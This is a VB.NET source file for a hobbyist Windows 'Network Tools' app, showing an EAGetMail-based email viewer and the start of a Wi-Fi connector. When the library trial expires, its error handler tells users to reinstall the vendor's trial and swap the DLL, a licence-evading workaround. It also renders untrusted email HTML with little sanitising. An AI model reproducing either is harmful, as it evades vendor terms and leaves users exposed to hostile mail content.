'This Program is coded by : David Sanculane                                              |
'Email   :   davidsanculane@gmail.com                                                    |
'Website :   http://www.davidsoft.webs.com                                                       |
'----------------------------------------------------------------------------------------|
'Libraries needed to run the program
'Library:-                                  'Description:-
'-----------                               -----------------
Imports System                              'The System namespace contains fundamental classes and base classes that define commonly-used value and reference data types, events and event handlers, interfaces, attributes, and processing exceptions.
Imports System.Collections.Generic          'The System.Collections.Generic namespace contains interfaces and classes that define generic collections, which allow users to create strongly typed collections that provide better type safety and performance than non-generic strongly typed collections.
Imports System.Data                         'The System.Data namespace provides access to classes that represent the ADO.NET architecture. ADO.NET lets you build components that efficiently manage data from multiple data sources.
Imports System.Drawing                      'The System.Drawing namespace provides access to GDI+ basic graphics functionality. More advanced functionality is provided in the System.Drawing.Drawing2D, System.Drawing.Imaging, and System.Drawing.Text namespaces.
Imports System.Text                         'The System.Text namespace contains classes that represent ASCII and Unicode character encodings; abstract base classes for converting blocks of characters to and from blocks of bytes; and a helper class that manipulates and formats String objects without creating intermediate instances of String.
Imports System.Windows.Forms                'The System.Windows.Forms namespace contains classes for creating Windows-based applications that take full advantage of the rich user interface features available in the Microsoft Windows operating system.
Imports System.Linq                         'The System.Linq namespace provides classes and interfaces that support queries that use Language-Integrated Query (LINQ).
Imports System.Net                          'The System.Net namespace provides a simple programming interface for many of the protocols used on networks today.
Imports System.Xml                          'The System.Xml namespace provides standards-based support for processing XML.
Imports System.IO                           'The System.IO namespace contains types that allow reading and writing to files and data streams, and types that provide basic file and directory support.
Imports System.Xml.XPath                    'The System.Xml.XPath namespace contains the classes that define a cursor model for navigating and editing XML information items as instances of the XQuery 1.0 and XPath 2.0 Data Model.
Imports System.Collections.ObjectModel      'The System.Collections.ObjectModel namespace contains classes that can be used as collections in the object model of a reusable library. Use these classes when properties or methods return collections.
Imports System.Configuration                'The System.Configuration namespace contains the types that provide the programming model for handling configuration data.
Imports System.Runtime.CompilerServices     'The System.Runtime.CompilerServices namespace provides functionality for compiler writers who use managed code to specify attributes in metadata that affect the run-time behavior of the common language runtime.
Imports System.Security.SecurityException   'The System.Security.SecurityException namespace makes an exception when a security error is detected.
Imports System.Reflection                   'The System.Reflection namespace contains types that retrieve information about assemblies, modules, members, parameters, and other entities in managed code by examining their metadata.
Imports System.ComponentModel               'The System.ComponentModel namespace provides classes that are used to implement the run-time and design-time behavior of components and controls. This namespace includes the base classes and interfaces for implementing attributes and type converters, binding to data sources, and licensing components.
Imports System.Diagnostics                  'The System.Diagnostics namespace provides classes that allow you to interact with system processes, event logs, and performance counters.
Imports System.Threading                    'The System.Threading namespace provides classes and interfaces that enable multithreaded programming. In addition to classes for synchronizing thread activities and access to data (Mutex, Monitor, Interlocked, AutoResetEvent, and so on), this namespace includes a ThreadPool class that allows you to use a pool of system-supplied threads, and a Timer class that executes callback methods on thread pool threads.
Imports System.Net.Sockets                  'The System.Net.Sockets namespace provides a managed implementation of the Windows Sockets (Winsock) interface for developers who need to tightly control access to the network.
Imports System.DirectoryServices            'The System.DirectoryServices namespaces contain types that provide access to Active Directory from managed code.
Imports System.Net.NetworkInformation       'The System.Net.NetworkInformation namespace provides access to network traffic data, network address information, and notification of address changes for the local computer. The namespace also contains classes that implement the Ping utility.
Imports System.Text.RegularExpressions      'The System.Text.RegularExpressions namespace contains classes that provide access to the .NET Framework regular expression engine. The namespace provides regular expression functionality that may be used from any platform or language that runs within the Microsoft .NET Framework.
Imports System.Net.Mail                     'The System.Net.Mail namespace contains classes used to send electronic mail to a Simple Mail Transfer Protocol (SMTP) server for delivery.
Imports System.Net.Security                 'The System.Net.Security namespace provides network streams for secure communications between hosts.
Imports System.Runtime.InteropServices      'The System.Runtime.InteropServices namespace provides a wide variety of members that support COM interop and platform invoke services.
Imports Email.Net.Common                    'This Library Is Very Important For E-mail Functions.
Imports Email.Net.Common.Collections        'Collections Of Funections For Email.Net.Common
Imports Email.Net.Common.Configurations     'Configurations For Email.Net Library
Imports Email.Net.Pop3                      'This Library Is Used To Check Account Information Using POP3 Server.
Imports EAGetMail                           'EAGetMail Library Is Used To Recieve E-mails Using POP3 Server Or IMAP Server.
Imports Network_Tools.YT                    'YT Stands For YouTube , This Library Is Used To Download YouTube Videos.
Imports Microsoft.Win32                     'The Microsoft.Win32 namespace provides two types of classes: those that handle events raised by the operating system and those that manipulate the system registry.
Imports System.Management                   'Provides access to a rich set of management information and management events about the system, devices, and applications instrumented to the Windows Management Instrumentation (WMI) infrastructure. 
Imports Network_Tools.IcsManagerLibrary     'This library is used to share internet connection from network adapter which is connected to the internet.
Public Class Form1
    'Settings For Email Viewer,YouTube Downloader and Wi-Fi Hotspot
    Inherits System.Windows.Forms.Form
    Implements IComparer
    Implements System.IDisposable
    Dim yts As YouTubeService = Nothing
    Private m_arUidl As ArrayList = New ArrayList
    Private m_bcancel As Boolean = False
    Private m_uidlfile As String = "uidl.txt"
    Private m_curpath As String = ""
    Public SysPath As String = Environment.GetFolderPath(Environment.SpecialFolder.System)
    Public CommandSeperator As String = "&&"
    Public IcsVirtualAdapterIdArray As New ComboBox
    Public IcsVirtualAdapterId As String
    '----------------------------------------------------------------------------------
    'Code for Email Viewer - Program(g):
    '-------------------------------------------
    'IComparer Members For Email Viewer
#Region "IComparer Members"
    'sort the email as received data.
    Function Compare(ByVal x As Object, ByVal y As Object) As Integer Implements IComparer.Compare
        Dim itemx As ListViewItem = x
        Dim itemy As ListViewItem = y

        Dim sx() As Char = itemx.SubItems(2).Text.ToCharArray()
        Dim sy() As Char = itemy.SubItems(2).Text.ToCharArray()
        If sx.Length <> sy.Length Then
            Compare = -1
            Exit Function 'should never occured.
        End If

        Dim count As Integer = sx.Length
        For i As Integer = 0 To count - 1

            If sx(i) > sy(i) Then
                Compare = -1
                Exit Function
            ElseIf sx(i) < sy(i) Then
                Compare = 1
                Exit Function
            End If
        Next
        Compare = 0
    End Function

#End Region
    'EAGetMail Event Handler To Handle Events For Email Viewer
#Region "EAGetMail Event Handler"
    Private Sub OnConnected(ByVal sender As Object, ByRef cancel As Boolean)
        lblStatus.Text = "Connected ..."
        cancel = m_bcancel
        Application.DoEvents()
    End Sub

    Private Sub OnQuit(ByVal sender As Object, ByRef cancel As Boolean)
        lblStatus.Text = "Quit ..."
        cancel = m_bcancel
        Application.DoEvents()
    End Sub

    Private Sub OnReceivingDataStream(ByVal sender As Object, ByVal info As MailInfo, ByVal received As Integer, ByVal total As Integer, ByRef cancel As Boolean)
        pgBar.Minimum = 0
        pgBar.Maximum = total
        pgBar.Value = received
        cancel = m_bcancel
        Application.DoEvents()
    End Sub

    Private Sub OnIdle(ByVal sender As Object, ByRef cancel As Boolean)
        cancel = m_bcancel
        Application.DoEvents()
    End Sub

    Private Sub OnAuthorized(ByVal sender As Object, ByRef cancel As Boolean)
        lblStatus.Text = "Authorized ..."
        cancel = m_bcancel
        Application.DoEvents()
    End Sub

    Private Sub OnSecuring(ByVal sender As Object, ByRef cancel As Boolean)
        lblStatus.Text = "Securing ..."
        cancel = m_bcancel
        Application.DoEvents()
    End Sub
#End Region
    'Parse and Display Mails To Parse and Display Mails For Email Viewer
#Region "Parse and Display Mails"
    Private Sub LoadMails()
        lstMail.Items.Clear()
        Dim mailFolder As String = String.Format("{0}\inbox", m_curpath)

        If (Not Directory.Exists(mailFolder)) Then
            Directory.CreateDirectory(mailFolder)
        End If

        Dim files() As String = Directory.GetFiles(mailFolder, "*.eml")
        Dim count As Integer = files.Length
        For i As Integer = 0 To count - 1
            Dim fullname As String = files(i)
            'For evaluation usage, please use "TryIt" as the license code, otherwise the 
            '"invalid license code" exception will be thrown. However, the object will expire in 1-2 months, then
            '"trial version expired" exception will be thrown.
            Dim oMail As New Mail("TryIt")

            'Load( file, true ) only load the email header to Mail object to save the CPU and memory
            ' the Mail object will load the whole email file later automatically if bodytext or attachment is required..
            oMail.Load(fullname, True)

            Dim item As ListViewItem = New ListViewItem(oMail.From.ToString())
            item.SubItems.Add(oMail.Subject)
            item.SubItems.Add(oMail.ReceivedDate.ToString("yyyy-MM-dd HH:mm:ss"))
            item.Tag = fullname
            lstMail.Items.Add(item)

            Dim pos As Integer = fullname.LastIndexOf(".")
            Dim mainName As String = fullname.Substring(0, pos)
            Dim htmlName As String = mainName + ".htm"
            If Not File.Exists(htmlName) Then
                ' this email is unread, we set the font style to bold.
                item.Font = New System.Drawing.Font(item.Font, FontStyle.Bold)
            End If
            oMail.Clear()
        Next
    End Sub

    Private Function _FormatHtmlTag(ByVal src As String) As String
        src = src.Replace(">", "&gt;")
        src = src.Replace("<", "&lt;")
        _FormatHtmlTag = src
    End Function

    'we generate a html + attachment folder for every email, once the html is create,
    ' next time we don't need to parse the email again.
    Private Sub _GenerateHtmlForEmail(ByVal htmlName As String, ByVal emlFile As String, ByVal tempFolder As String)
        'For evaluation usage, please use "TryIt" as the license code, otherwise the 
        '"invalid license code" exception will be thrown. However, the object will expire in 1-2 months, then
        '"trial version expired" exception will be thrown.
        Dim oMail As New Mail("TryIt")
        oMail.Load(emlFile, False)

        If (oMail.IsEncrypted) Then
            Try
                'this email is encrypted, we decrypt it by user default certificate.
                ' you can also use specified certificate like this
                ' oCert = new Certificate()
                'oCert.Load("c:\test.pfx", "pfxpassword", Certificate.CertificateKeyLocation.CRYPT_USER_KEYSET)
                ' oMail = oMail.Decrypt( oCert )
                oMail = oMail.Decrypt(Nothing)
            Catch ep As Exception
                MessageBox.Show(ep.Message)
                oMail.Load(emlFile, False)
            End Try
        End If

        If (oMail.IsSigned) Then
            Try
                'this email is digital signed.
                Dim cert As EAGetMail.Certificate = oMail.VerifySignature()
                MessageBox.Show("This email contains a valid digital signature.")
                'you can add the certificate to your certificate storage like this
                'cert.AddToStore( Certificate.CertificateStoreLocation.CERT_SYSTEM_STORE_CURRENT_USER,"addressbook" );
                ' then you can use send the encrypted email back to this sender.
            Catch ep As Exception
                MessageBox.Show(ep.Message)
            End Try
        End If

        ' decode winmail.dat (Outlook TNEF Stream) automatically.
        ' also convert RTF body to HTML body automatically
        oMail.DecodeTNEF()

        Dim html As String = oMail.HtmlBody
        Dim hdr As New StringBuilder
        hdr.Append("<font face=""Courier New,Arial"" size=2>")
        hdr.Append("<b>From:</b> " + _FormatHtmlTag(oMail.From.ToString()) + "<br>")

        Dim addrs() As EAGetMail.MailAddress = oMail.To
        Dim count As Integer = addrs.Length
        If (count > 0) Then
            hdr.Append("<b>To:</b> ")
            For i As Integer = 0 To count - 1
                hdr.Append(_FormatHtmlTag(addrs(i).ToString()))
                If (i < count - 1) Then
                    hdr.Append(";")
                End If
            Next
            hdr.Append("<br>")
        End If

        addrs = oMail.Cc
        count = addrs.Length
        If (count > 0) Then
            hdr.Append("<b>Cc:</b> ")
            For i As Integer = 0 To count - 1

                hdr.Append(_FormatHtmlTag(addrs(i).ToString()))
                If (i < count - 1) Then
                    hdr.Append(";")
                End If
            Next
            hdr.Append("<br>")
        End If

        hdr.Append(String.Format("<b>Subject:</b>{0}<br>" & vbCrLf, _FormatHtmlTag(oMail.Subject)))

        Dim atts() As EAGetMail.Attachment = oMail.Attachments
        count = atts.Length
        If (count > 0) Then

            If (Not Directory.Exists(tempFolder)) Then
                Directory.CreateDirectory(tempFolder)
            End If

            hdr.Append("<b>Attachments:</b>")
            For i As Integer = 0 To count - 1
                Dim att As EAGetMail.Attachment = atts(i)

                Dim attname As String = String.Format("{0}\{1}", tempFolder, att.Name)
                att.SaveAs(attname, True)
                hdr.Append(String.Format("<a href=""{0}"" target=""_blank"">{1}</a> ", attname, att.Name))
                If (att.ContentID.Length > 0) Then
                    'show embedded image.
                    html = html.Replace("cid:" + att.ContentID, attname)
                ElseIf (String.Compare(att.ContentType, 0, "image/", 0, "image/".Length, True) = 0) Then
                    'show attached image.
                    html = html + String.Format("<hr><img src=""{0}"">", attname)
                End If

            Next
        End If

        Dim reg As Regex = New Regex("(<meta[^>]*charset[ \t]*=[ \t""]*)([^<> \r\n""]*)", RegexOptions.Multiline Or RegexOptions.IgnoreCase)
        html = reg.Replace(html, "$1utf-8")
        If Not (reg.IsMatch(html)) Then
            hdr.Insert(0, "<meta HTTP-EQUIV=""Content-Type"" Content=""text/html; charset=utf-8"">")
        End If

        html = hdr.ToString() + "<hr>" + html
        Dim fs As New FileStream(htmlName, FileMode.Create, FileAccess.Write, FileShare.None)
        Dim data() As Byte = System.Text.UTF8Encoding.UTF8.GetBytes(html)
        fs.Write(data, 0, data.Length)
        fs.Close()
        oMail.Clear()
    End Sub

    Private Sub ShowMail(ByVal fileName As String)
        Try
            Dim pos As Integer = fileName.LastIndexOf(".")
            Dim mainName As String = fileName.Substring(0, pos)
            Dim htmlName As String = mainName + ".htm"

            Dim tempFolder As String = mainName
            If Not (File.Exists(htmlName)) Then
                'we haven't generate the html for this email, generate it now.
                _GenerateHtmlForEmail(htmlName, fileName, tempFolder)
            End If
            Form3.webMail.Navigate(htmlName)
        Catch ep As Exception
            MessageBox.Show(ep.Message)
        End Try
    End Sub
#End Region
    'Start-Up For Email Viewer
    Private Sub Form1_Load_EmailViewer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'Navigate to blank page
        Form3.webMail.Navigate("about:blank")
        'Adding items to Protocol List
        lstProtocol.Items.Add("POP3")
        lstProtocol.Items.Add("IMAP4")
        lstProtocol.Items.Add("Exchange Web Service - 2007/2010")
        lstProtocol.Items.Add("Exchange WebDAV - Exchange 2000/2003")
        lstProtocol.SelectedIndex = 0
        'Adding items to Authentication Type List
        lstAuthType.Items.Add("USER/LOGIN")
        lstAuthType.Items.Add("APOP")
        lstAuthType.Items.Add("NTLM")
        lstAuthType.SelectedIndex = 0
        'Declaring Path As The Path where the program is opened.
        Dim path As String = Application.ExecutablePath
        Dim pos As Integer = path.LastIndexOf("\")
        If pos <> -1 Then
            path = path.Substring(0, pos)
        End If
        m_curpath = path
        'Sorting Mail List
        lstMail.Sorting = SortOrder.Descending
        lstMail.ListViewItemSorter = Me
        'Loading Mails
        LoadMails()
        'Counting Mails
        lblTotal.Text = String.Format("Total {0} email(s)", lstMail.Items.Count)
    End Sub
    'Cancel Button
    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        m_bcancel = True
    End Sub
    'Select All Button To Select All Mails
    Private Sub btnSel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSel.Click
        For i = 0 To lstMail.Items.Count - 1
            lstMail.Items(i).Selected = True
        Next i
    End Sub
    'Delete Button To Delete Mails
    Private Sub btnDel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDel.Click
        Dim items As ListView.SelectedListViewItemCollection = lstMail.SelectedItems
        If items.Count = 0 Then
            Exit Sub
        End If
        'Asking For Deleting Selected Mails
        If MessageBox.Show("Do you want to delete all selected emails", _
                                 "", _
                                 MessageBoxButtons.YesNo) = DialogResult.No Then
            Exit Sub
        End If
        'Deleting Mails
        Do While (items.Count > 0)
            Try
                Dim fileName As String = items(0).Tag
                File.Delete(fileName)
                Dim pos As Integer = fileName.LastIndexOf(".")
                Dim tempFolder As String = fileName.Substring(0, pos)
                Dim htmlName As String = tempFolder + ".htm"
                If (File.Exists(htmlName)) Then
                    File.Delete(htmlName)
                End If

                If (Directory.Exists(tempFolder)) Then
                    Directory.Delete(tempFolder, True)
                End If
                lstMail.Items.Remove(items(0))
            Catch ep As Exception
                MessageBox.Show(ep.Message)
                Exit Do
            End Try
        Loop
        'Counting Remaining Mails
        lblTotal.Text = String.Format("Total {0} email(s)", lstMail.Items.Count)
        Form3.webMail.Navigate("about:blank")
    End Sub
    'textServerComboBox Code
    Private Sub textServer_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles textServer.SelectedIndexChanged
        If textServer.SelectedItem = "pop.gmail.com" Then
            textUser.Text = "@gmail.com"
            outlookComboBox.Hide()
            gmxComboBox.Hide()
            arrow.Hide()
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" Then
            outlookComboBox.Show()
            gmxComboBox.Hide()
            textUser.Clear()
            arrow.Show()
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Hotmail" Then
            textUser.Text = "@hotmail.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Live" Then
            textUser.Text = "@live.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Outlook" Then
            textUser.Text = "@outlook.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Msn" Then
            textUser.Text = "@msn.com"
        End If
        If textServer.SelectedItem = "pop.aol.com" Then
            textUser.Text = "@aol.com"
            outlookComboBox.Hide()
            gmxComboBox.Hide()
            arrow.Hide()
        End If
        If textServer.SelectedItem = "pop.mail.yahoo.com" Then
            outlookComboBox.Hide()
            gmxComboBox.Hide()
            arrow.Hide()
            textUser.Text = "@yahoo.com"
        End If
        If textServer.SelectedItem = "pop.gmx.com" Then
            textUser.Clear()
            outlookComboBox.Hide()
            gmxComboBox.Show()
            arrow.Show()
        End If
        If textServer.SelectedItem = "pop.gmx.com" And gmxComboBox.SelectedItem = "gmx.com" Then
            textUser.Text = "@gmx.com"
        End If
        If textServer.SelectedItem = "pop.gmx.com" And gmxComboBox.SelectedItem = "gmx.us" Then
            textUser.Text = "@gmx.us"
        End If
        If textServer.SelectedItem = "pop.mail.com" Then
            textUser.Text = "@mail.com"
            outlookComboBox.Hide()
            gmxComboBox.Hide()
            arrow.Hide()
        End If
    End Sub
    'outlookComboBox Code
    Private Sub outlookComboBox_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles outlookComboBox.SelectedIndexChanged
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Hotmail" Then
            textUser.Text = "@hotmail.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Live" Then
            textUser.Text = "@live.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Outlook" Then
            textUser.Text = "@outlook.com"
        End If
        If textServer.SelectedItem = "pop-mail.outlook.com" And outlookComboBox.SelectedItem = "Msn" Then
            textUser.Text = "@msn.com"
        End If

    End Sub
    'gmxComboBox Code
    Private Sub gmxComboBox_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles gmxComboBox.SelectedIndexChanged
        If textServer.SelectedItem = "pop.gmx.com" And gmxComboBox.SelectedItem = "gmx.com" Then
            textUser.Text = "@gmx.com"
        End If
        If textServer.SelectedItem = "pop.gmx.com" And gmxComboBox.SelectedItem = "gmx.us" Then
            textUser.Text = "@gmx.us"
        End If
    End Sub
    'Button Start To Recieve Mails
    Private Sub btnStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStart.Click
        If lbl7.Text = "127.0.0.1" Then
            MsgBox("You are disconnected from the internet , check your connection and try again.", MsgBoxStyle.Critical, "Error...")
            Exit Sub
        End If
        Dim server, user, password As String
        server = textServer.Text.Trim()
        user = textUser.Text.Trim()
        password = textPassword.Text.Trim()

        If (server.Length = 0 Or user.Length = 0 Or password.Length = 0) Then
            MessageBox.Show("Please input server, user and password.")
            Exit Sub
        End If

        btnStart.Enabled = False
        btnCancel.Enabled = True
        Try
            Dim authType As ServerAuthType = ServerAuthType.AuthLogin
            If (lstAuthType.SelectedIndex = 1) Then
                authType = ServerAuthType.AuthCRAM5
            ElseIf (lstAuthType.SelectedIndex = 2) Then
                authType = ServerAuthType.AuthNTLM
            End If

            Dim protocol As ServerProtocol = lstProtocol.SelectedIndex


            Dim oServer As MailServer = New MailServer(server, user, password, _
        chkSSL.Checked, authType, protocol)

            'For evaluation usage, please use "TryIt" as the license code, otherwise the 
            '"invalid license code" exception will be thrown. However, the object will expire in 1-2 months, then
            '"trial version expired" exception will be thrown.

            Dim oClient As MailClient = New MailClient("TryIt")
            'Catching the following events is not necessary, 
            'just make the application more user friendly.
            'If you use the object in asp.net/windows service or non-gui application, 
            'You need not to catch the following events.
            'To learn more detail, please refer to the code in EAGetMail EventHandler region

            AddHandler oClient.OnAuthorized, AddressOf OnAuthorized
            AddHandler oClient.OnConnected, AddressOf OnConnected
            AddHandler oClient.OnIdle, AddressOf OnIdle
            AddHandler oClient.OnSecuring, AddressOf OnSecuring
            AddHandler oClient.OnReceivingDataStream, AddressOf OnReceivingDataStream
            Dim bLeaveCopy As Boolean = chkLeaveCopy.Checked

            ' UIDL is the identifier of every email on POP3/IMAP4/Exchange server, to avoid retrieve
            ' the same email from server more than once, we record the email UIDL retrieved every time
            ' if you delete the email from server every time and not to leave a copy of email on
            ' the server, then please remove all the function about uidl.
            ' UIDLManager wraps the function to write/read uidl record from a text file
            Dim oUIDLManager As New UIDLManager()

            Try

                ' load existed uidl records to UIDLManager
                Dim uidlfile As String = String.Format("{0}\{1}", m_curpath, m_uidlfile)
                oUIDLManager.Load(uidlfile)


                Dim mailFolder As String = String.Format("{0}\inbox", m_curpath)
                If Not Directory.Exists(mailFolder) Then
                    Directory.CreateDirectory(mailFolder)
                End If

                m_bcancel = False
                lblStatus.Text = "Connecting ..."
                oClient.Connect(oServer)
                Dim infos() As MailInfo = oClient.GetMailInfos()
                lblStatus.Text = String.Format("Total {0} email(s)", infos.Length)

                ' remove the local uidl which is not existed on the server.
                oUIDLManager.SyncUIDL(oServer, infos)
                oUIDLManager.Update()

                Dim count As Integer = infos.Length

                For i As Integer = 0 To count - 1
                    Dim info As MailInfo = infos(i)
                    If oUIDLManager.FindUIDL(oServer, info.UIDL) Is Nothing Then
                        ' This email has not been downloaded, download it now.

                        lblStatus.Text = String.Format("Retrieving {0}/{1}...", info.Index, count)
                        Dim oMail As Mail = oClient.GetMail(info)
                        Dim d As System.DateTime = System.DateTime.Now
                        Dim cur As System.Globalization.CultureInfo = New System.Globalization.CultureInfo("en-US")
                        Dim sdate As String = d.ToString("yyyyMMddHHmmss", cur)
                        Dim fileName As String = String.Format("{0}\{1}{2}{3}.eml", mailFolder, sdate, d.Millisecond.ToString("d3"), i)
                        oMail.SaveAs(fileName, True)

                        Dim item As ListViewItem = New ListViewItem(oMail.From.ToString())
                        item.SubItems.Add(oMail.Subject)
                        item.SubItems.Add(oMail.ReceivedDate.ToString("yyyy-MM-dd HH:mm:ss"))
                        item.Font = New System.Drawing.Font(item.Font, FontStyle.Bold)
                        item.Tag = fileName
                        lstMail.Items.Insert(0, item)
                        oMail.Clear()
                        lblTotal.Text = String.Format("Total {0} email(s)", lstMail.Items.Count)

                        If (bLeaveCopy) Then
                            ' Add the email UIDL to uidl file to avoid we retrieve it next time. 
                            oUIDLManager.AddUIDL(oServer, info.UIDL, fileName)
                        End If
                    End If
                Next

                If Not (bLeaveCopy) Then
                    lblStatus.Text = "Deleting ..."
                    For i As Integer = 0 To count - 1
                        oClient.Delete(infos(i))
                        ' Remove UIDL from local uidl file.
                        oUIDLManager.RemoveUIDL(oServer, infos(i).UIDL)
                    Next
                End If
                ' Delete method just mark the email as deleted, 
                ' Quit method pure the emails from server exactly.
                oClient.Quit()

            Catch ep As Exception
                MessageBox.Show(ep.Message)
            End Try

            ' Update the uidl list to local uidl text file and then we can load it next time.
            oUIDLManager.Update()

            lblStatus.Text = "Completed"
            pgBar.Maximum = 100
            pgBar.Minimum = 0
            pgBar.Value = 0
            btnStart.Enabled = True
            btnCancel.Enabled = False
        Catch ex As Exception
            MsgBox("The trial version of the library has ended , but i will solve this problem now ! :D - Don't worry!", MsgBoxStyle.Information, "NOTICE")
            Process.Start("https://www.emailarchitect.net/webapp/download/eagetmail.exe")
            MsgBox("All you have to do is to download this Setup file , Install it and copy EAGetMail40.dll file from [C:\Program Files (x86)\EAGetMail] to the folder of the program [REPLACE THE OLD FILE EAGetMail40.dll WITH THE NEW ONE] (You need to close this program before replacing the file , then reopen the program)", MsgBoxStyle.Information, "The Solution")
        End Try
    End Sub
    'Opening Mail When The User Double Click A Mail In Mail List
    Private Sub lstMail_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles lstMail.DoubleClick
        Form3.Show()
        Dim items As ListView.SelectedListViewItemCollection = lstMail.SelectedItems
        If items.Count = 0 Then
            Exit Sub
        End If
        Dim item As ListViewItem = items(0)
        ShowMail(item.Tag)
        item.Font = New System.Drawing.Font(item.Font, FontStyle.Regular)
    End Sub
    Private Sub lstProtocol_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstProtocol.SelectedIndexChanged
        ' By default, Exchange Web Service requires SSL connection.
        ' For other protocol, please set SSL connection based on your server setting manually
        If lstProtocol.SelectedIndex = ServerProtocol.ExchangeEWS Then
            chkSSL.Checked = True
        End If
    End Sub
    Private Sub lblTotal_textChanged(sender As Object, e As EventArgs) Handles lblTotal.TextChanged
        If lblTotal.Text.Contains("0") Then
            btnSel.Enabled = False
            btnSel.Enabled = False
        Else
            btnSel.Enabled = True
            btnSel.Enabled = True
        End If
    End Sub
    '------------------------------------------------------------------------------------
    'Code for Wi-Fi Connector - Program(A)
    '-------------------------------------------
    'Function used to get SSID of Wi-Fi network
    Private Shared Function GetStringForSSID(ByVal ssid As Wlan.Dot11Ssid) As String
        'Returning the name of each Wi-Fi network
        Return Encoding.ASCII.GetString(ssid.SSID, 0, CInt(ssid.SSIDLength))
    End Function
    'Function used to change Security Type to specific names
    Private Shared Function GetEncryptionState(ByVal encrypt As String) As String
        If (encrypt = "RSNA_PSK") Then
            Return "WPA2"        'RSNA_PSK will be changed to WPA2
        End If
        If (encrypt = "WPA_PSK") Then
            Return "WPA"         'WPA_PSK will be changed to WPA
        End If
        If (encrypt = "IEEE80211_Open") Then
            Return "Open"        'IEEE80211_Open will be changed to Open
        End If
        If (encrypt = "RSNA") Then
            Return "WPA2_EAP"    'RSNA will be changed to WPA2_EAP
        End If
        If (encrypt = "IEEE80211_SharedKey") Then
            Return "Shared"      'IEEE80211_SharedKey will be changed to Shared
        End If
        Return encrypt
    End Function
    'Function used to change Encryption Type to specific names
    Private Shared Function GetEncryptionType(ByVal type As String) As String
        If (type = "CCMP") Then
            Return "AES"         'CCMP will be changed to AES
        End If
        If (type = "TKIP") Then
            Return "TKIP"        'TKIP will be the same (no changes)
        End If
        Return type
    End Function
    'Function used to change flags to specific names
    Private Shared Function GetFlag(ByVal flags As String) As String
        If (flags = "HasProfile") Then
            Return "Saved , Disconnected" 'HasProfile will be changed to Saved , Disconnected
        End If
        If (flags = "Connected, HasProfile") Then
            Return "Saved , Connected"    'Connected, HasProfile will be changed to Saved , Connected
        End If
        If (flags = "0") Then
            Return "Not Saved"            '0 will be changed to Not Saved
        End If
        Return flags
    End Function
    'Declarations for Wi-Fi Profile details
    Public Structure sProfilDetail
        Dim SSID As String             'SSID of the Wi-Fi network
        Dim SSIDhex As String          'HEX of the Wi-Fi network
        Dim authentication As String   'Security Type of Wi-Fi network
        Dim encryption As String       'Encryption Type of Wi-Fi network
        Dim useOneX As String          'useOneX property - By default , it is false
        Dim keyType As String          'key type of Wi-Fi network (passPhrase for secured networks and network key for non-secured networks)
        Dim isProtected As String      'is protected property     (determines whether the network is secured or not)
        Dim keyMaterial As String      'Security Key of Wi-Fi network
        Dim keyIndex As String         'Index of the key
    End Structure
    'Function used to get Wi-fi Profile details
    Function ProfileDetail(ByVal XMLProfile As String) As sProfilDetail
        Dim result As New sProfilDetail 'This result is Wi-Fi network profile details
        'Creating new XML document
        Dim document As XPathDocument = New XPathDocument(New StringReader(XMLProfile))
        'Starting navigation to created document
        Dim navigator As XPathNavigator = document.CreateNavigator()
        'Declaring a XML manager and creating new namespace for saved Wi-Fi networks
        Dim manager As XmlNamespaceManager = New XmlNamespaceManager(navigator.NameTable)
        manager.AddNamespace("s", "http://www.microsoft.com/networking/WLAN/profile/v1")
        'Catching all saved Wi-Fi profiles with all its needed details
        On Error Resume Next
        result.SSID = navigator.SelectSingleNode("/s:WLANProfile/s:name", manager).InnerXml
        result.SSIDhex = navigator.SelectSingleNode("/s:WLANProfile/s:SSIDConfig/s:SSID/s:hex", manager).InnerXml
        result.authentication = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:authEncryption/s:authentication", manager).InnerXml
        result.encryption = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:authEncryption/s:encryption", manager).InnerXml
        result.useOneX = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:authEncryption/s:useOneX", manager).InnerXml
        result.keyType = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:sharedKey/s:keyType", manager).InnerXml
        result.isProtected = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:sharedKey/s:protected", manager).InnerXml
        result.keyMaterial = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:sharedKey/s:keyMaterial", manager).InnerXml
        result.keyIndex = navigator.SelectSingleNode("/s:WLANProfile/s:MSM/s:security/s:keyIndex", manager).InnerXml
        'Getting the Wi-Fi profiles
        Return result
        '/WLANProfile/name
    End Function
    'Code for Timer1A , it is used to : display connected SSID , getting adapter details and scanning for available Wi-Fi networks
    Private Sub Timer1A_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerA1.Tick
        'Disabling some tools
        passchkbox.Enabled = False
        btnConnect.Enabled = False
        saved.Enabled = False
        passbox.Enabled = False
        passbox.Clear()
        delete.Enabled = False
        'Enabling some tools
        lstNetworks.Enabled = True
        btn_disconnect.Enabled = True
        btn_refresh.Enabled = True
        'THIS WILL DISPLAY THE CONNECTED WI-FI'S SSID
        Dim wlan = New WlanClient()
